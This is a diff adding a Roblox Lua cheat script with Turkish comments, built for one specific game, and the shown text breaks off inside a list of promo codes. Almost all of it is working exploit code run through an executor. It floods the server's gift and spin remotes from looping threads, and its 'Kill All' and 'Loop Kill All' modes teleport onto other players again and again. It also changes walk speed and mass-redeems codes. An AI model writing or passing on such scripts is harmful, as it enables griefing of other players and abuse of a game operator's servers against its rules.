@@ -1,0 +1,1406 @@
+-- Hizmetleri al
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- PlaceId kontrolü
+local SUPPORTED_PLACE_ID = 8200787440
+local currentPlaceId = game.PlaceId
+
+-- Bildirim GUI'si (PlaceId uyuşmazsa gösterilecek)
+local function createNotification()
+    local success, err = pcall(function()
+        local player = game.Players.LocalPlayer
+        local playerGui = player.PlayerGui
+        local notificationGui = Instance.new("ScreenGui")
+        notificationGui.Name = "NotificationGUI"
+        notificationGui.Parent = playerGui
+        notificationGui.ResetOnSpawn = false
+
+        local backdrop = Instance.new("Frame")
+        backdrop.Size = UDim2.new(1, 0, 1, 0)
+        backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        backdrop.BackgroundTransparency = 0.5
+        backdrop.Parent = notificationGui
+
+        local notificationFrame = Instance.new("Frame")
+        notificationFrame.Size = UDim2.new(0, 400, 0, 200)
+        notificationFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
+        notificationFrame.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
+        notificationFrame.BorderSizePixel = 0
+        notificationFrame.Parent = notificationGui
+
+        local notificationCorner = Instance.new("UICorner")
+        notificationCorner.CornerRadius = UDim.new(0, 10)
+        notificationCorner.Parent = notificationFrame
+
+        local notificationText = Instance.new("TextLabel")
+        notificationText.Size = UDim2.new(0.9, 0, 0.4, 0)
+        notificationText.Position = UDim2.new(0.05, 0, 0.1, 0)
+        notificationText.BackgroundTransparency = 1
+        notificationText.Text = "Unsupported Game! Want Join?"
+        notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        notificationText.TextScaled = true
+        notificationText.Font = Enum.Font.GothamBold
+        notificationText.Parent = notificationFrame
+
+        local yesButton = Instance.new("TextButton")
+        yesButton.Size = UDim2.new(0, 100, 0, 40)
+        yesButton.Position = UDim2.new(0.2, 0, 0.6, 0)
+        yesButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+        yesButton.Text = "Yes"
+        yesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        yesButton.TextScaled = true
+        yesButton.Font = Enum.Font.GothamBold
+        yesButton.Parent = notificationFrame
+
+        local yesCorner = Instance.new("UICorner")
+        yesCorner.CornerRadius = UDim.new(0, 10)
+        yesCorner.Parent = yesButton
+
+        local noButton = Instance.new("TextButton")
+        noButton.Size = UDim2.new(0, 100, 0, 40)
+        noButton.Position = UDim2.new(0.55, 0, 0.6, 0)
+        noButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        noButton.Text = "No"
+        noButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        noButton.TextScaled = true
+        noButton.Font = Enum.Font.GothamBold
+        noButton.Parent = notificationFrame
+
+        local noCorner = Instance.new("UICorner")
+        noCorner.CornerRadius = UDim.new(0, 10)
+        noCorner.Parent = noButton
+
+        yesButton.MouseButton1Click:Connect(function()
+            TeleportService:Teleport(SUPPORTED_PLACE_ID)
+        end)
+
+        noButton.MouseButton1Click:Connect(function()
+            notificationGui:Destroy()
+        end)
+
+        yesButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(yesButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 255, 0)})
+            tween:Play()
+        end)
+
+        yesButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(yesButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 200, 0)})
+            tween:Play()
+        end)
+
+        noButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(noButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
+            tween:Play()
+        end)
+
+        noButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(noButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)})
+            tween:Play()
+        end)
+    end)
+    if not success then
+        warn("Notification GUI creation failed: " .. tostring(err))
+    end
+end
+
+-- Belirli bir oyuncuya ışınlanma fonksiyonu
+local function teleportToPlayer(playerName)
+    local Character = LocalPlayer.Character
+    local Humanoid = Character and Character:FindFirstChild("Humanoid")
+    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
+    local StartPosition = HumanoidRootPart and HumanoidRootPart.Position
+
+    if not HumanoidRootPart or not StartPosition or not Humanoid then
+        warn("Karakter, Humanoid veya HumanoidRootPart bulunamadı!")
+        return
+    end
+
+    local targetPlayer
+    if type(playerName) == "string" then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and string.find(string.lower(player.Name), string.lower(playerName)) then
+                targetPlayer = player
+                break
+            end
+        end
+    elseif typeof(playerName) == "Instance" and playerName:IsA("Player") then
+        targetPlayer = playerName
+    end
+
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        -- Ses efekti oluştur ve oynat
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://9119707263" -- Bang ses efekti
+        sound.Volume = 1
+        sound.Parent = game:GetService("SoundService")
+        sound:Play()
+        sound.Ended:Connect(function()
+            sound:Destroy()
+        end)
+
+        for i = 1, 5 do
+            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+                -- İleri hareket (W tuşu simülasyonu)
+                Humanoid:Move(Vector3.new(0, 0, -1), true)
+            else
+                break
+            end
+            task.wait(2 / 5) -- 2 saniyede 5 ışınlanma (0.4 saniye aralık)
+        end
+        HumanoidRootPart.CFrame = CFrame.new(StartPosition)
+    else
+        warn("Hedef oyuncu bulunamadı veya HumanoidRootPart mevcut değil!")
+    end
+end
+
+-- Tüm oyunculara ışınlanma fonksiyonu
+local function teleportToPlayers(loop)
+    local Character = LocalPlayer.Character
+    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
+    local StartPosition = HumanoidRootPart and HumanoidRootPart.Position
+
+    if not HumanoidRootPart or not StartPosition then
+        warn("Karakter veya HumanoidRootPart bulunamadı!")
+        return
+    end
+
+    if loop then
+        while getgenv().loopKillAll do
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    teleportToPlayer(player)
+                    task.wait(2) -- Her oyuncu arasında 2 saniye bekle
+                end
+            end
+        end
+    else
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                teleportToPlayer(player)
+                task.wait(2) -- Her oyuncu arasında 2 saniye bekle
+            end
+        end
+    end
+end
+
+-- Ana GUI oluşturma fonksiyonu
+local function createMainGUI()
+    local success, err = pcall(function()
+        local RemoteFunction = ReplicatedStorage.Packages._Index["sleitnick_knit@1.5.1"].knit.Services.GiftService.RF.GetPresent
+        local SpinService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.5.1"].knit.Services.SpinService.RE
+        getgenv().running = false
+        getgenv().loopKillAll = false
+        getgenv().autoSpin = false
+        local guiKeybind = "F"
+        local toggleKeybind = "Q"
+        local loopKillAllKeybind = "L"
+        local killAllKeybind = "T"
+        local autoSpinKeybind = "P"
+
+        -- Keybind çakışması kontrol fonksiyonu
+        local function checkKeybindConflict(input, excludeKeybind)
+            local keybinds = {guiKeybind, toggleKeybind, loopKillAllKeybind, killAllKeybind, autoSpinKeybind}
+            if excludeKeybind then
+                for i, key in ipairs(keybinds) do
+                    if key == excludeKeybind then
+                        keybinds[i] = nil
+                    end
+                end
+            end
+            for _, key in ipairs(keybinds) do
+                if key and key:upper() == input:upper() then
+                    return true
+                end
+            end
+            return false
+        end
+
+        local player = game.Players.LocalPlayer
+        local playerGui = player.PlayerGui
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "InfiniteEverythingGUI"
+        screenGui.Parent = playerGui
+        screenGui.ResetOnSpawn = false
+        screenGui.Enabled = true
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 300, 0, 600)
+        frame.Position = UDim2.new(0.5, -150, 0.5, -300)
+        frame.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
+        frame.BorderSizePixel = 0
+        frame.Parent = screenGui
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 10)
+        corner.Parent = frame
+
+        local gradient = Instance.new("UIGradient")
+        gradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 30, 60)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 10, 30))
+        }
+        gradient.Rotation = 45
+        gradient.Parent = frame
+
+        local titleBar = Instance.new("Frame")
+        titleBar.Size = UDim2.new(1, 0, 0, 30)
+        titleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        titleBar.BorderSizePixel = 0
+        titleBar.Parent = frame
+
+        local titleCorner = Instance.new("UICorner")
+        titleCorner.CornerRadius = UDim.new(0, 10)
+        titleCorner.Parent = titleBar
+
+        local titleText = Instance.new("TextLabel")
+        titleText.Size = UDim2.new(0.7, 0, 1, 0)
+        titleText.Position = UDim2.new(0.1, 0, 0, 0)
+        titleText.BackgroundTransparency = 1
+        titleText.Text = "Infinite Everything"
+        titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        titleText.TextScaled = true
+        titleText.Font = Enum.Font.GothamBold
+        titleText.Parent = titleBar
+
+        local closeButton = Instance.new("TextButton")
+        closeButton.Size = UDim2.new(0, 30, 0, 30)
+        closeButton.Position = UDim2.new(1, -30, 0, 0)
+        closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        closeButton.Text = "X"
+        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        closeButton.TextScaled = true
+        closeButton.Font = Enum.Font.GothamBold
+        closeButton.Parent = titleBar
+
+        local closeCorner = Instance.new("UICorner")
+        closeCorner.CornerRadius = UDim.new(0, 5)
+        closeCorner.Parent = closeButton
+
+        local minimizeButton = Instance.new("TextButton")
+        minimizeButton.Size = UDim2.new(0, 30, 0, 30)
+        minimizeButton.Position = UDim2.new(1, -60, 0, 0)
+        minimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        minimizeButton.Text = "-"
+        minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        minimizeButton.TextScaled = true
+        minimizeButton.Font = Enum.Font.GothamBold
+        minimizeButton.Parent = titleBar
+
+        local minimizeCorner = Instance.new("UICorner")
+        minimizeCorner.CornerRadius = UDim.new(0, 5)
+        minimizeCorner.Parent = minimizeButton
+
+        local toggleButton = Instance.new("TextButton")
+        toggleButton.Size = UDim2.new(0, 150, 0, 40)
+        toggleButton.Position = UDim2.new(0.5, -75, 0.08, 0)
+        toggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+        toggleButton.Text = "Spam Everything: OFF"
+        toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        toggleButton.TextScaled = true
+        toggleButton.Font = Enum.Font.GothamBold
+        toggleButton.Parent = frame
+
+        local toggleCorner = Instance.new("UICorner")
+        toggleCorner.CornerRadius = UDim.new(0, 10)
+        toggleCorner.Parent = toggleButton
+
+        local statusLabel = Instance.new("TextLabel")
+        statusLabel.Size = UDim2.new(0, 200, 0, 20)
+        statusLabel.Position = UDim2.new(0.5, -100, 0.15, 0)
+        statusLabel.BackgroundTransparency = 1
+        statusLabel.Text = "Spam Everything: OFF"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        statusLabel.TextScaled = true
+        statusLabel.Font = Enum.Font.Gotham
+        statusLabel.Parent = frame
+
+        local loopKillAllButton = Instance.new("TextButton")
+        loopKillAllButton.Size = UDim2.new(0, 100, 0, 30)
+        loopKillAllButton.Position = UDim2.new(0.5, -50, 0.21, 0)
+        loopKillAllButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+        loopKillAllButton.Text = "Loop Kill All: OFF"
+        loopKillAllButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        loopKillAllButton.TextScaled = true
+        loopKillAllButton.Font = Enum.Font.GothamBold
+        loopKillAllButton.Parent = frame
+
+        local loopKillAllCorner = Instance.new("UICorner")
+        loopKillAllCorner.CornerRadius = UDim.new(0, 10)
+        loopKillAllCorner.Parent = loopKillAllButton
+
+        local loopKillAllStatusLabel = Instance.new("TextLabel")
+        loopKillAllStatusLabel.Size = UDim2.new(0, 200, 0, 20)
+        loopKillAllStatusLabel.Position = UDim2.new(0.5, -100, 0.27, 0)
+        loopKillAllStatusLabel.BackgroundTransparency = 1
+        loopKillAllStatusLabel.Text = "Loop Kill All: OFF"
+        loopKillAllStatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        loopKillAllStatusLabel.TextScaled = true
+        loopKillAllStatusLabel.Font = Enum.Font.Gotham
+        loopKillAllStatusLabel.Parent = frame
+
+        local autoSpinButton = Instance.new("TextButton")
+        autoSpinButton.Size = UDim2.new(0, 100, 0, 30)
+        autoSpinButton.Position = UDim2.new(0.5, -50, 0.33, 0)
+        autoSpinButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+        autoSpinButton.Text = "Auto Spin: OFF"
+        autoSpinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        autoSpinButton.TextScaled = true
+        autoSpinButton.Font = Enum.Font.GothamBold
+        autoSpinButton.Parent = frame
+
+        local autoSpinCorner = Instance.new("UICorner")
+        autoSpinCorner.CornerRadius = UDim.new(0, 10)
+        autoSpinCorner.Parent = autoSpinButton
+
+        local autoSpinStatusLabel = Instance.new("TextLabel")
+        autoSpinStatusLabel.Size = UDim2.new(0, 200, 0, 20)
+        autoSpinStatusLabel.Position = UDim2.new(0.5, -100, 0.39, 0)
+        autoSpinStatusLabel.BackgroundTransparency = 1
+        autoSpinStatusLabel.Text = "Auto Spin: OFF"
+        autoSpinStatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        autoSpinStatusLabel.TextScaled = true
+        autoSpinStatusLabel.Font = Enum.Font.Gotham
+        autoSpinStatusLabel.Parent = frame
+
+        local redeemAllCodesButton = Instance.new("TextButton")
+        redeemAllCodesButton.Size = UDim2.new(0, 100, 0, 30)
+        redeemAllCodesButton.Position = UDim2.new(0.5, -50, 0.45, 0)
+        redeemAllCodesButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        redeemAllCodesButton.Text = "Redeem All Codes"
+        redeemAllCodesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        redeemAllCodesButton.TextScaled = true
+        redeemAllCodesButton.Font = Enum.Font.GothamBold
+        redeemAllCodesButton.Parent = frame
+
+        local redeemAllCodesCorner = Instance.new("UICorner")
+        redeemAllCodesCorner.CornerRadius = UDim.new(0, 10)
+        redeemAllCodesCorner.Parent = redeemAllCodesButton
+
+        local killAllButton = Instance.new("TextButton")
+        killAllButton.Size = UDim2.new(0, 100, 0, 30)
+        killAllButton.Position = UDim2.new(0.5, -50, 0.51, 0)
+        killAllButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        killAllButton.Text = "Kill All"
+        killAllButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        killAllButton.TextScaled = true
+        killAllButton.Font = Enum.Font.GothamBold
+        killAllButton.Parent = frame
+
+        local killAllCorner = Instance.new("UICorner")
+        killAllCorner.CornerRadius = UDim.new(0, 10)
+        killAllCorner.Parent = killAllButton
+
+        local killPlayerLabel = Instance.new("TextLabel")
+        killPlayerLabel.Size = UDim2.new(0, 100, 0, 20)
+        killPlayerLabel.Position = UDim2.new(0.15, 0, 0.57, 0)
+        killPlayerLabel.BackgroundTransparency = 1
+        killPlayerLabel.Text = "Kill Player:"
+        killPlayerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        killPlayerLabel.TextScaled = true
+        killPlayerLabel.Font = Enum.Font.Gotham
+        killPlayerLabel.Parent = frame
+
+        local killPlayerTextbox = Instance.new("TextBox")
+        killPlayerTextbox.Size = UDim2.new(0, 100, 0, 20)
+        killPlayerTextbox.Position = UDim2.new(0.65, 0, 0.57, 0)
+        killPlayerTextbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        killPlayerTextbox.PlaceholderText = "Player Name"
+        killPlayerTextbox.Text = ""
+        killPlayerTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        killPlayerTextbox.TextScaled = true
+        killPlayerTextbox.Font = Enum.Font.GothamBold
+        killPlayerTextbox.Parent = frame
+
+        local killPlayerTextboxCorner = Instance.new("UICorner")
+        killPlayerTextboxCorner.CornerRadius = UDim.new(0, 5)
+        killPlayerTextboxCorner.Parent = killPlayerTextbox
+
+        local walkSpeedLabel = Instance.new("TextLabel")
+        walkSpeedLabel.Size = UDim2.new(0, 100, 0, 20)
+        walkSpeedLabel.Position = UDim2.new(0.15, 0, 0.63, 0)
+        walkSpeedLabel.BackgroundTransparency = 1
+        walkSpeedLabel.Text = "Set WalkSpeed:"
+        walkSpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        walkSpeedLabel.TextScaled = true
+        walkSpeedLabel.Font = Enum.Font.Gotham
+        walkSpeedLabel.Parent = frame
+
+        local walkSpeedTextbox = Instance.new("TextBox")
+        walkSpeedTextbox.Size = UDim2.new(0, 100, 0, 20)
+        walkSpeedTextbox.Position = UDim2.new(0.65, 0, 0.63, 0)
+        walkSpeedTextbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        walkSpeedTextbox.PlaceholderText = "Enter Speed"
+        walkSpeedTextbox.Text = ""
+        walkSpeedTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        walkSpeedTextbox.TextScaled = true
+        walkSpeedTextbox.Font = Enum.Font.GothamBold
+        walkSpeedTextbox.Parent = frame
+
+        local walkSpeedTextboxCorner = Instance.new("UICorner")
+        walkSpeedTextboxCorner.CornerRadius = UDim.new(0, 5)
+        walkSpeedTextboxCorner.Parent = walkSpeedTextbox
+
+        local guiKeybindLabel = Instance.new("TextLabel")
+        guiKeybindLabel.Size = UDim2.new(0, 100, 0, 20)
+        guiKeybindLabel.Position = UDim2.new(0.15, 0, 0.69, 0)
+        guiKeybindLabel.BackgroundTransparency = 1
+        guiKeybindLabel.Text = "GUI Keybind:"
+        guiKeybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        guiKeybindLabel.TextScaled = true
+        guiKeybindLabel.Font = Enum.Font.Gotham
+        guiKeybindLabel.Parent = frame
+
+        local guiKeybindTextbox = Instance.new("TextBox")
+        guiKeybindTextbox.Size = UDim2.new(0, 30, 0, 20)
+        guiKeybindTextbox.Position = UDim2.new(0.65, 0, 0.69, 0)
+        guiKeybindTextbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        guiKeybindTextbox.Text = guiKeybind
+        guiKeybindTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        guiKeybindTextbox.TextScaled = true
+        guiKeybindTextbox.Font = Enum.Font.GothamBold
+        guiKeybindTextbox.Parent = frame
+
+        local guiKeybindCorner = Instance.new("UICorner")
+        guiKeybindCorner.CornerRadius = UDim.new(0, 5)
+        guiKeybindCorner.Parent = guiKeybindTextbox
+
+        local toggleKeybindLabel = Instance.new("TextLabel")
+        toggleKeybindLabel.Size = UDim2.new(0, 100, 0, 20)
+        toggleKeybindLabel.Position = UDim2.new(0.15, 0, 0.75, 0)
+        toggleKeybindLabel.BackgroundTransparency = 1
+        toggleKeybindLabel.Text = "Toggle Keybind:"
+        toggleKeybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        toggleKeybindLabel.TextScaled = true
+        toggleKeybindLabel.Font = Enum.Font.Gotham
+        toggleKeybindLabel.Parent = frame
+
+        local toggleKeybindTextbox = Instance.new("TextBox")
+        toggleKeybindTextbox.Size = UDim2.new(0, 30, 0, 20)
+        toggleKeybindTextbox.Position = UDim2.new(0.65, 0, 0.75, 0)
+        toggleKeybindTextbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        toggleKeybindTextbox.Text = toggleKeybind
+        toggleKeybindTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        toggleKeybindTextbox.TextScaled = true
+        toggleKeybindTextbox.Font = Enum.Font.GothamBold
+        toggleKeybindTextbox.Parent = frame
+
+        local toggleKeybindCorner = Instance.new("UICorner")
+        toggleKeybindCorner.CornerRadius = UDim.new(0, 5)
+        toggleKeybindCorner.Parent = toggleKeybindTextbox
+
+        local loopKillAllKeybindLabel = Instance.new("TextLabel")
+        loopKillAllKeybindLabel.Size = UDim2.new(0, 100, 0, 20)
+        loopKillAllKeybindLabel.Position = UDim2.new(0.15, 0, 0.81, 0)
+        loopKillAllKeybindLabel.BackgroundTransparency = 1
+        loopKillAllKeybindLabel.Text = "Loop Kill Keybind:"
+        loopKillAllKeybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        loopKillAllKeybindLabel.TextScaled = true
+        loopKillAllKeybindLabel.Font = Enum.Font.Gotham
+        loopKillAllKeybindLabel.Parent = frame
+
+        local loopKillAllKeybindTextbox = Instance.new("TextBox")
+        loopKillAllKeybindTextbox.Size = UDim2.new(0, 30, 0, 20)
+        loopKillAllKeybindTextbox.Position = UDim2.new(0.65, 0, 0.81, 0)
+        loopKillAllKeybindTextbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        loopKillAllKeybindTextbox.Text = loopKillAllKeybind
+        loopKillAllKeybindTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        loopKillAllKeybindTextbox.TextScaled = true
+        loopKillAllKeybindTextbox.Font = Enum.Font.GothamBold
+        loopKillAllKeybindTextbox.Parent = frame
+
+        local loopKillAllKeybindCorner = Instance.new("UICorner")
+        loopKillAllKeybindCorner.CornerRadius = UDim.new(0, 5)
+        loopKillAllKeybindCorner.Parent = loopKillAllKeybindTextbox
+
+        local killAllKeybindLabel = Instance.new("TextLabel")
+        killAllKeybindLabel.Size = UDim2.new(0, 100, 0, 20)
+        killAllKeybindLabel.Position = UDim2.new(0.15, 0, 0.87, 0)
+        killAllKeybindLabel.BackgroundTransparency = 1
+        killAllKeybindLabel.Text = "Kill All Keybind:"
+        killAllKeybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        killAllKeybindLabel.TextScaled = true
+        killAllKeybindLabel.Font = Enum.Font.Gotham
+        killAllKeybindLabel.Parent = frame
+
+        local killAllKeybindTextbox = Instance.new("TextBox")
+        killAllKeybindTextbox.Size = UDim2.new(0, 30, 0, 20)
+        killAllKeybindTextbox.Position = UDim2.new(0.65, 0, 0.87, 0)
+        killAllKeybindTextbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        killAllKeybindTextbox.Text = killAllKeybind
+        killAllKeybindTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        killAllKeybindTextbox.TextScaled = true
+        killAllKeybindTextbox.Font = Enum.Font.GothamBold
+        killAllKeybindTextbox.Parent = frame
+
+        local killAllKeybindCorner = Instance.new("UICorner")
+        killAllKeybindCorner.CornerRadius = UDim.new(0, 5)
+        killAllKeybindCorner.Parent = killAllKeybindTextbox
+
+        local autoSpinKeybindLabel = Instance.new("TextLabel")
+        autoSpinKeybindLabel.Size = UDim2.new(0, 100, 0, 20)
+        autoSpinKeybindLabel.Position = UDim2.new(0.15, 0, 0.93, 0)
+        autoSpinKeybindLabel.BackgroundTransparency = 1
+        autoSpinKeybindLabel.Text = "Auto Spin Keybind:"
+        autoSpinKeybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        autoSpinKeybindLabel.TextScaled = true
+        autoSpinKeybindLabel.Font = Enum.Font.Gotham
+        autoSpinKeybindLabel.Parent = frame
+
+        local autoSpinKeybindTextbox = Instance.new("TextBox")
+        autoSpinKeybindTextbox.Size = UDim2.new(0, 30, 0, 20)
+        autoSpinKeybindTextbox.Position = UDim2.new(0.65, 0, 0.93, 0)
+        autoSpinKeybindTextbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        autoSpinKeybindTextbox.Text = autoSpinKeybind
+        autoSpinKeybindTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        autoSpinKeybindTextbox.TextScaled = true
+        autoSpinKeybindTextbox.Font = Enum.Font.GothamBold
+        autoSpinKeybindTextbox.Parent = frame
+
+        local autoSpinKeybindCorner = Instance.new("UICorner")
+        autoSpinKeybindCorner.CornerRadius = UDim.new(0, 5)
+        autoSpinKeybindCorner.Parent = autoSpinKeybindTextbox
+
+        local toggleStroke = Instance.new("UIStroke")
+        toggleStroke.Thickness = 2
+        toggleStroke.Color = Color3.fromRGB(0, 255, 255)
+        toggleStroke.Enabled = false
+        toggleStroke.Parent = toggleButton
+
+        local loopKillAllStroke = Instance.new("UIStroke")
+        loopKillAllStroke.Thickness = 2
+        loopKillAllStroke.Color = Color3.fromRGB(0, 255, 255)
+        loopKillAllStroke.Enabled = false
+        loopKillAllStroke.Parent = loopKillAllButton
+
+        local autoSpinStroke = Instance.new("UIStroke")
+        autoSpinStroke.Thickness = 2
+        autoSpinStroke.Color = Color3.fromRGB(0, 255, 255)
+        autoSpinStroke.Enabled = false
+        autoSpinStroke.Parent = autoSpinButton
+
+        local dragging
+        local dragInput
+        local dragStart
+        local startPos
+
+        local function updateInput(input)
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+
+        titleBar.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = input.Position
+                startPos = frame.Position
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        dragging = false
+                    end
+                end)
+            end
+        end)
+
+        titleBar.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+                dragInput = input
+            end
+        end)
+
+        UserInputService.InputChanged:Connect(function(input)
+            if input == dragInput and dragging then
+                updateInput(input)
+            end
+        end)
+
+        local function toggleState()
+            getgenv().running = not getgenv().running
+            if getgenv().running then
+                toggleButton.Text = "Spam Everything: ON"
+                toggleButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+                statusLabel.Text = "Spam Everything: ON"
+                statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+                toggleStroke.Enabled = true
+                for i = 1, 5 do
+                    spawn(function()
+                        while getgenv().running do
+                            local success, err = pcall(function()
+                                RemoteFunction:InvokeServer("Present")
+                            end)
+                            if not success then
+                                warn("GiftService Error: " .. tostring(err))
+                            end
+                            task.wait(0.1)
+                        end
+                    end)
+                end
+            else
+                toggleButton.Text = "Spam Everything: OFF"
+                toggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+                statusLabel.Text = "Spam Everything: OFF"
+                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+                toggleStroke.Enabled = false
+            end
+        end
+
+        local function toggleLoopKillAll()
+            getgenv().loopKillAll = not getgenv().loopKillAll
+            if getgenv().loopKillAll then
+                loopKillAllButton.Text = "Loop Kill All: ON"
+                loopKillAllButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+                loopKillAllStatusLabel.Text = "Loop Kill All: ON"
+                loopKillAllStatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+                loopKillAllStroke.Enabled = true
+                spawn(function()
+                    teleportToPlayers(true)
+                end)
+            else
+                loopKillAllButton.Text = "Loop Kill All: OFF"
+                loopKillAllButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+                loopKillAllStatusLabel.Text = "Loop Kill All: OFF"
+                loopKillAllStatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+                loopKillAllStroke.Enabled = false
+            end
+        end
+
+        local function toggleAutoSpin()
+            getgenv().autoSpin = not getgenv().autoSpin
+            if getgenv().autoSpin then
+                autoSpinButton.Text = "Auto Spin: ON"
+                autoSpinButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+                autoSpinStatusLabel.Text = "Auto Spin: ON"
+                autoSpinStatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+                autoSpinStroke.Enabled = true
+                spawn(function()
+                    while getgenv().autoSpin do
+                        local success, err = pcall(function()
+                            SpinService.SkullSpinButtonPressed:FireServer()
+                            task.wait(4)
+                            SpinService.FreeSpinButtonPressed:FireServer()
+                        end)
+                        if not success then
+                            warn("Auto Spin Error: " .. tostring(err))
+                        end
+                        task.wait(4)
+                    end
+                end)
+            else
+                autoSpinButton.Text = "Auto Spin: OFF"
+                autoSpinButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+                autoSpinStatusLabel.Text = "Auto Spin: OFF"
+                autoSpinStatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+                autoSpinStroke.Enabled = false
+            end
+        end
+
+        local function triggerKillAll()
+            spawn(function()
+                teleportToPlayers(false)
+            end)
+        end
+
+        local function redeemAllCodes()
+            local TFunction = ReplicatedStorage:WaitForChild("Events"):WaitForChild("TFunction")
+            local codes = {
+                "SANTA", "PRESENTS", "TURKEY", "BOK", "THANKSGIVING", "SPOOKY", "GHOST", "CANDYCORN",
+                "BLOBBY", "ABC", "YAY", "170KLIKES", "YIPPEE", "FUNFUN", "165KLIKES", "FIREWORK",
+                "BOOM", "GLORP", "UPD26", "160KLIKES", "UPD25", "BUGS", "FUNSIZE", "150KLIKES",
